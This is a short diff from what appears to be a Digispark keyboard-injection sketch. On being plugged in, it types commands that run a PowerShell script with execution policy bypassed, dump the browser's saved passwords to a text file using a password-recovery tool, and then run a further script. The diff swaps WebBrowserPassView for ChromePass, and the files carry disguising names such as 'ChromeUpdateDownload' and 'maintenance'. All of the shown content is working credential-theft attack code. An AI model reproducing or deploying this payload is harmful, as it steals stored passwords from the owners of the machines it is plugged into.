@@ -25,7 +25,7 @@ void setup()
   DigiKeyboard.delay(20);  
   DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File ChromeUpdateDownload.ps1");
   DigiKeyboard.delay(50);
-  DigiKeyboard.println("WebBrowserPassView.exe /stext maintenance.txt");
+  DigiKeyboard.println("ChromePass.exe /stext maintenance.txt");
   DigiKeyboard.delay(50);
   DigiKeyboard.println("powershell ./maintenance.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
